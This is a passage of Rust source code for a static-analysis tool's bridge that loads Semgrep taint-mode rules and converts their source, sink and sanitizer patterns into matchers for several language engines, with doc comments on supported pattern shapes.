//! Semgrep-compatible YAML bridge for `mode: taint` rules.
//!
//! This module parses a *narrow* subset of Semgrep's taint-mode schema into
//! foxguard's [`TaintSpec`] so that users can load existing Semgrep taint
//! rules via `--rules` without rewriting them.
//!
//! # Supported today
//!
//! - `mode: taint` with `languages: [python]`, `languages: [javascript]` /
//!   `[typescript]` / `[js]` / `[ts]`, `languages: [go]` / `[golang]`,
//!   `languages: [java]`, `languages: [c]`, `languages: [kotlin]` /
//!   `[kt]`, `languages: [ruby]` / `[rb]`, or `languages: [php]`.
//!   Other languages are rejected with a warning and the rule is skipped;
//!   non-taint rules fall through to the regular Semgrep bridge.
//! - `pattern-sources`, `pattern-sinks`, `pattern-sanitizers` as lists of
//!   single-`pattern:` entries, `pattern-either:` lists (which may nest
//!   recursively and flatten into multiple matchers for the same role), **or**
//!   `patterns:` AND-blocks (see below).
//! - `patterns:` AND-blocks inside source/sink/sanitizer entries: the bridge
//!   extracts all `pattern:` and `pattern-either:` sub-items as expressible
//!   matchers. Constraint-only sub-items (`pattern-inside:`, `pattern-not:`,
//!   `focus-metavariable:`, `metavariable-*:`) are dropped with a per-key
//!   warning (documented broadening — see COMPATIBILITY.md). If the block
//!   produces at least one expressible matcher, the entry is loaded; otherwise
//!   the entry is warn-skipped without aborting the whole rule.
//! - Severity mapping via the same `map_severity` used by the pattern-rule
//!   bridge (`ERROR` → Critical, `WARNING` → High, `INFO` → Medium).
//! - `metadata.cwe` propagated to findings.
//!
//! # Unsupported (rule is skipped with a warning)
//!
//! - Any `mode: taint` rule that does not target Python, JavaScript/TypeScript,
//!   Go, Java, C, or Kotlin.
//! - Any `pattern:` string whose shape is not one of:
//!   - bare identifier (`request`) — compiled to `ParamName`
//!   - dotted attribute chain (`request.data`, `request.json`) — compiled
//!     to `Attribute { root, field }` using the *leftmost* identifier and
//!     the *outermost* attribute (nested chains like `request.session.id`
//!     are flattened to `root="request", field="id"`; documented as a known
//!     gap that matches the engine's own one-level attribute propagation).
//!   - call form (`pickle.loads($X)`, `pickle.loads(...)`, `func($X)`,
//!     `func()`) — compiled to `Call { canonical }`, stripping arguments.
//!   - metavariable-receiver call (`$CONN.executeQuery($X)`,
//!     `$OBJ.innerHTML($X)`) — compiled to `MethodName { method }`, which
//!     matches any invocation of that method name regardless of receiver.
//!     Only valid as a sink or sanitizer shape; rejected as a source.
//!   - metavariable-receiver assignment (`$EL.innerHTML = $X`,
//!     `$EL.outerHTML = $X`) — compiled to `MemberAssign { field }`, which
//!     matches any property-assignment sink whose property name equals
//!     `field`. Only meaningful for JavaScript/TypeScript rules (the JS
//!     engine recognises this as a DOM-XSS sink pattern); other language
//!     engines include the matcher in the compiled spec but silently ignore
//!     it. Only valid as a sink or sanitizer shape; rejected as a source.
//!
//! A `patterns:` entry with NO expressible matchers (only constraint-only
//! sub-items) is warn-skipped. If all source or sink entries are warn-skipped
//! and none survive, the whole rule is skipped.

use crate::rules::apex_taint;
use crate::rules::bash_taint;
use crate::rules::c_taint;
use crate::rules::common::get_source_line;
use crate::rules::csharp_taint;
use crate::rules::go_taint;
use crate::rules::java_taint;
use crate::rules::javascript_taint;
use crate::rules::kotlin_taint;
use crate::rules::php_taint;
use crate::rules::python_taint;
use crate::rules::ruby_taint;
use crate::rules::scala_taint;
use crate::rules::solidity_taint;
use crate::rules::swift_taint;
use crate::rules::{FileContext, Rule};
use crate::{Finding, Language, Severity};
use serde_yaml_ng::Value as YamlValue;

// ─── Language-agnostic intermediate representation ───────────────────────
//
// The YAML bridge only produces three matcher shapes (Attribute, Call,
// ParamName).  Each engine has its own `NodeMatcher` enum with extra
// variants, but the YAML-compiled subset is identical across all three.
// We compile YAML into `GenericMatcher` first, then convert to the
// engine-specific type at analysis time.

#[derive(Clone, Debug)]
enum GenericMatcher {
    Attribute {
        root: String,
        field: String,
        description: String,
    },
    Call {
        canonical: String,
        description: String,
    },
    ParamName {
        names: Vec<String>,
        description: String,
    },
    /// Matches any method call whose final method name equals `method`,
    /// regardless of receiver. Compiled from patterns of the form
    /// `$METAVAR.method($X)` — the metavariable receiver is discarded and
    /// the engine matches any invocation of that method name.
    ///
    /// Supported as a sink/sanitizer shape for Python, JavaScript, Go, Java,
    /// and Kotlin. For C the matcher is included in the spec but the C engine
    /// only matches bare `Call` patterns, so `MethodName` entries are silently
    /// skipped (no C OOP method calls exist).
    MethodName { method: String, description: String },

    /// Matches any call whose CALLEE TEXT matches a compiled regex. Compiled
    /// from a taint sink/sanitizer `patterns:` AND-block that pairs a bare
    /// metavariable callee pattern (`$F(...)`) with a `metavariable-regex`
    /// pinning that metavariable. The regex is what bounds the otherwise
    /// universal bare-metavar callee, so the shape becomes FP-safe (only calls
    /// whose callee matches fire). Sink/sanitizer only.
    CallRegex {
        regex: crate::rules::semgrep_compat::CompiledRegex,
        description: String,
    },

    /// Matches any method call whose FINAL METHOD NAME matches a compiled
    /// regex, regardless of receiver. Compiled from a `$OBJ.$M(...)` pattern
    /// paired with a `metavariable-regex` pinning the method metavariable `$M`.
    /// The any-receiver, regex-bounded analogue of [`GenericMatcher::MethodName`].
    /// Sink/sanitizer only.
    MethodNameRegex {
        regex: crate::rules::semgrep_compat::CompiledRegex,
        description: String,
    },

    /// Matches any call whose callee root identifier equals `receiver`,
    /// regardless of method — compiled from `receiver.$METAVAR(...)` where
    /// `receiver` is a concrete identifier and the method is a metavariable
    /// (e.g. `os.$METHOD(...)`, `subprocess.$FUNC(...)`, `Kernel.$X(...)`).
    /// The symmetric counterpart of [`GenericMatcher::MethodName`]. Sink or
    /// sanitizer only.
    ReceiverCall {
        receiver: String,
        description: String,
    },

    /// Matches a member/property/attribute READ `<anything>.field`
    /// regardless of the receiver. Compiled from patterns of the form
    /// `$METAVAR.field` (a metavariable receiver, a plain-identifier field),
    /// e.g. `$REQ.body`, `$REQ.query`, `$REQ.headers`, `$REQ.cookies`,
    /// `$REQ.params`.
    ///
    /// This is the any-receiver analogue of [`GenericMatcher::Attribute`],
    /// which requires a concrete `root` identifier and so rejects a
    /// metavariable receiver like `$REQ.body`. It is the dominant rejected
    /// source shape across the registry (web-request property reads).
    ///
    /// Meaningful for object/property languages (Python, JS/TS, Go, Java,
    /// Kotlin, Ruby, PHP, C#) as a source, sink, or sanitizer. For C the
    /// matcher is carried in the spec but the engine no-ops it (plain C has
    /// no property-read sources).
    FieldName { field: String, description: String },

    /// Matches a subscript / index access `base[...]`. Compiled from patterns
    /// like `params[...]`, `cookies[...]`, `request.POST[...]`,
    /// `flask.request.args[...]`, or `$VALS[$INDEX]`.
    ///
    /// `base = Some(name)` matches a subscript whose indexed operand's final
    /// segment equals `name` (the last identifier before the `[`). For a
    /// metavariable base (`$M[...]`, `$VALS[$INDEX]`) `base = None` matches
    /// any subscript. Web frameworks express request-map indexing this way
    /// (`request.POST[...]`, `flask.request.args[...]`).
    ///
    /// Meaningful for object/property languages; the C engine no-ops it.
    Subscript {
        base: Option<String>,
        description: String,
    },

    /// Matches a property-assignment sink of the form `$EL.field = $X`.
    /// Compiled from Semgrep patterns like `$EL.innerHTML = $X` where the
    /// receiver is any Semgrep metavariable and `field` is a plain identifier.
    ///
    /// Only meaningful as a sink shape for JavaScript/TypeScript rules — the
    /// JS engine recognises `NodeMatcher::MemberAssign` for DOM-XSS patterns
    /// (`element.innerHTML = tainted`, `element.outerHTML = tainted`, etc.).
    /// For all other language engines the matcher is included in the compiled
    /// spec but silently ignored (those engines have no concept of
    /// property-assignment sinks). Only valid as a sink or sanitizer shape;
    /// rejected as a source.
    MemberAssign { field: String, description: String },

    /// Matches a string-building SINK containing a tainted value. Compiled
    /// from Semgrep sink patterns such as `"$SQL" + $EXPR`, `$M % $M`,
    /// `$A + $B`, f-strings `f"...{$X}..."`, and format calls
    /// `fmt.Sprintf("$FMT", ...)`, `sprintf($FMT, ...)`.
    ///
    /// Semantics: a SINK that is a binary `+`/`%` expression, an interpolated/
    /// format string, or a format call where one operand is a string literal/
    /// format AND the tainted value flows into another operand. Conservative
    /// (a non-tainted or literal-only concatenation never fires). Maps to
    /// SQL-injection / command-string sinks. Sink/sanitizer only.
    BinopFormat { description: String },

    /// Matches an object/dict literal SINK one of whose value positions holds a
    /// tainted expression. Compiled from Semgrep sink patterns such as
    /// `{role: "system", content: $SINK}` (JS object literal) or
    /// `{"role": "system", "content": $SINK}` (Python dict) — the LLM
    /// system-prompt-injection rules (`openai`/`mistral`).
    ///
    /// Semantics: a SINK that is an object/dict literal construction where some
    /// field's value is the tainted value. Conservative (only fires when a
    /// literal is actually constructed AND a tainted value reaches a value
    /// slot). Sink/sanitizer only — a literal construction is a destination,
    /// not a taint origin. JS/TS and Python engines match it; others carry it.
    ObjectLiteralValue { description: String },

    /// Matches a `return $METAVAR` SINK: a `return` statement whose returned
    /// value is tainted. Compiled from Semgrep sink patterns of the form
    /// `return $SINK` / `return $X` (LLM "unsanitized return" and Flask
    /// directly-returned-format rules). Bounded to return position — only fires
    /// when a `return` returns a tainted value, not a universal bare-metavar
    /// sink. Sink/sanitizer only. Matched by the Python engine.
    ReturnValue { description: String },
}

#[derive(Clone, Debug)]
struct GenericSpec {
    sources: Vec<GenericMatcher>,
    sinks: Vec<GenericMatcher>,
    sanitizers: Vec<GenericMatcher>,
}

/// Compiled `pattern-not` constraints extracted from a taint rule's
/// `patterns:` AND-blocks, retained so the post-filter can enforce them
/// instead of dropping them (the historical precision bug).
///
/// Each entry is a SEARCH-mode [`CompiledAstPattern`] — compiled via the
/// same path as positive `pattern-not` matchers in `semgrep_compat.rs` —
/// so negative matching reuses the existing tree-sitter pattern engine
/// rather than the limited node-shape `GenericMatcher` vocabulary.
///
/// Constraints are partitioned by the role of the `patterns:` block they
/// came from: a `pattern-not` inside `pattern-sinks` is enforced against
/// the finding's sink node; one inside `pattern-sources` against the
/// source node. Source-side enforcement currently requires a source byte
/// range the finding does not carry (see [`SemgrepTaintRule`]
/// post-filter), so source negatives are collected but not yet applied —
/// see COMPATIBILITY.md for the deferred items.
#[derive(Clone, Default)]
struct TaintNegatives {
    /// `pattern-not` matchers compiled from `pattern-sinks` blocks.
    /// Enforced against each finding's sink byte range in the post-filter.
    sink: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
    /// `pattern-not` matchers compiled from `pattern-sources` blocks.
    /// Collected (so we stop dropping them) but enforcement is deferred
    /// until findings carry source byte offsets.
    #[allow(dead_code)]
    source: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
}

/// Compiled `pattern-inside` constraints extracted from a taint rule's
/// `patterns:` AND-blocks, retained so the post-filter can ENFORCE them
/// instead of dropping them (a precision bug: dropping a `pattern-inside`
/// makes the matcher fire everywhere instead of only inside the required
/// region).
///
/// Each entry is a SEARCH-mode [`CompiledAstPattern`] — compiled via the
/// same path as positive `pattern-inside` matchers in `semgrep_compat.rs`.
/// `pattern-inside` is the INVERSE of `pattern-not`: a `pattern-not`
/// suppresses a finding whose node is *inside* the matched region, while a
/// `pattern-inside` keeps a finding only when its node *is* inside the
/// matched region (and drops it otherwise).
///
/// Constraints are partitioned by the role of the `patterns:` block they came
/// from. A `pattern-inside` inside `pattern-sinks` is enforced against the
/// finding's sink node. Source-side enforcement would require a source byte
/// range the finding does not carry (same limitation as source-side
/// `pattern-not`), so source insides are collected but not yet applied.
#[derive(Clone, Default)]
struct TaintInsides {
    /// `pattern-inside` matchers compiled from `pattern-sinks` blocks.
    /// Enforced against each finding's sink byte range in the post-filter:
    /// a finding is kept only if its sink is contained by one of these.
    sink: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
    /// `pattern-inside` matchers compiled from `pattern-sources` blocks.
    /// Collected (so we stop dropping them) but enforcement is deferred
    /// until findings carry source byte offsets.
    #[allow(dead_code)]
    source: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
}

/// Convert the generic spec into a Python taint spec.
fn to_python_spec(g: &GenericSpec) -> python_taint::TaintSpec {
    python_taint::TaintSpec {
        sources: g.sources.iter().map(to_python_matcher).collect(),
        sinks: g.sinks.iter().map(to_python_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_python_matcher).collect(),
    }
}

fn to_python_matcher(m: &GenericMatcher) -> python_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => python_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => python_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => python_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => python_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => python_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            python_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => python_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => python_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => python_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Python engine ignores it (no property-assignment sinks in Python).
        GenericMatcher::MemberAssign { field, description } => {
            python_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => python_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            python_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => python_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a JavaScript taint spec.
fn to_js_spec(g: &GenericSpec) -> javascript_taint::TaintSpec {
    javascript_taint::TaintSpec {
        sources: g.sources.iter().map(to_js_matcher).collect(),
        sinks: g.sinks.iter().map(to_js_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_js_matcher).collect(),
    }
}

fn to_js_matcher(m: &GenericMatcher) -> javascript_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => javascript_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => javascript_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => {
            javascript_taint::NodeMatcher::ParamName {
                names: names.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodName {
            method,
            description,
        } => javascript_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => {
            javascript_taint::NodeMatcher::CallRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodNameRegex { regex, description } => {
            javascript_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => javascript_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => {
            javascript_taint::NodeMatcher::FieldName {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::Subscript { base, description } => {
            javascript_taint::NodeMatcher::Subscript {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MemberAssign { field, description } => {
            javascript_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => javascript_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            javascript_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => javascript_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Go taint spec.
fn to_go_spec(g: &GenericSpec) -> go_taint::TaintSpec {
    go_taint::TaintSpec {
        sources: g.sources.iter().map(to_go_matcher).collect(),
        sinks: g.sinks.iter().map(to_go_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_go_matcher).collect(),
    }
}

fn to_go_matcher(m: &GenericMatcher) -> go_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => go_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => go_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => go_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => go_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => go_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            go_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => go_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => go_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => go_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Go engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            go_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => go_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            go_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => go_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Java taint spec.
fn to_java_spec(g: &GenericSpec) -> java_taint::TaintSpec {
    java_taint::TaintSpec {
        sources: g.sources.iter().map(to_java_matcher).collect(),
        sinks: g.sinks.iter().map(to_java_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_java_matcher).collect(),
    }
}

fn to_java_matcher(m: &GenericMatcher) -> java_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => java_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => java_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => java_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => java_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => java_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            java_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => java_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => java_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => java_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Java engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            java_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => java_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            java_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => java_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a C taint spec.
fn to_c_spec(g: &GenericSpec) -> c_taint::TaintSpec {
    c_taint::TaintSpec {
        sources: g.sources.iter().map(to_c_matcher).collect(),
        sinks: g.sinks.iter().map(to_c_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_c_matcher).collect(),
    }
}

fn to_c_matcher(m: &GenericMatcher) -> c_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => c_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => c_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => c_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        // C has no OOP method calls; include the matcher for spec completeness but
        // the C engine only recognises `NodeMatcher::Call`, so it will never fire.
        GenericMatcher::MethodName {
            method,
            description,
        } => c_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => c_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            c_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        // ReceiverCall (`os.$METHOD(...)`) has no meaning in plain C; carried
        // in the spec but the C engine no-ops it.
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => c_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        // FieldName (property read) is not meaningful in plain C; carried in
        // the spec for completeness but the C engine no-ops it (like
        // MemberAssign below).
        GenericMatcher::FieldName { field, description } => c_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        // Subscript (index access) is not meaningful in plain C taint flow;
        // carried in the spec but the C engine no-ops it.
        GenericMatcher::Subscript { base, description } => c_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the C engine ignores it.
        GenericMatcher::MemberAssign { field, description } => c_taint::NodeMatcher::MemberAssign {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::BinopFormat { description } => c_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            c_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => c_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Kotlin taint spec.
fn to_kotlin_spec(g: &GenericSpec) -> kotlin_taint::TaintSpec {
    kotlin_taint::TaintSpec {
        sources: g.sources.iter().map(to_kotlin_matcher).collect(),
        sinks: g.sinks.iter().map(to_kotlin_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_kotlin_matcher).collect(),
    }
}

fn to_kotlin_matcher(m: &GenericMatcher) -> kotlin_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => kotlin_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => kotlin_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => kotlin_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => kotlin_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => kotlin_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            kotlin_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => kotlin_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => kotlin_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => kotlin_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Kotlin engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            kotlin_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => kotlin_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            kotlin_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => kotlin_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Ruby taint spec.
fn to_ruby_spec(g: &GenericSpec) -> ruby_taint::TaintSpec {
    ruby_taint::TaintSpec {
        sources: g.sources.iter().map(to_ruby_matcher).collect(),
        sinks: g.sinks.iter().map(to_ruby_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_ruby_matcher).collect(),
    }
}

fn to_ruby_matcher(m: &GenericMatcher) -> ruby_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => ruby_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => ruby_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => ruby_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => ruby_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => ruby_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            ruby_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => ruby_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => ruby_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => ruby_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Ruby engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            ruby_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => ruby_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            ruby_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => ruby_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a PHP taint spec.
fn to_php_spec(g: &GenericSpec) -> php_taint::TaintSpec {
    php_taint::TaintSpec {
        sources: g.sources.iter().map(to_php_matcher).collect(),
        sinks: g.sinks.iter().map(to_php_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_php_matcher).collect(),
    }
}

/// Convert the generic spec into a C# taint spec.
fn to_csharp_spec(g: &GenericSpec) -> csharp_taint::TaintSpec {
    csharp_taint::TaintSpec {
        sources: g.sources.iter().map(to_csharp_matcher).collect(),
        sinks: g.sinks.iter().map(to_csharp_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_csharp_matcher).collect(),
    }
}

fn to_csharp_matcher(m: &GenericMatcher) -> csharp_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => csharp_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => csharp_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => csharp_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => csharp_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => csharp_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            csharp_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
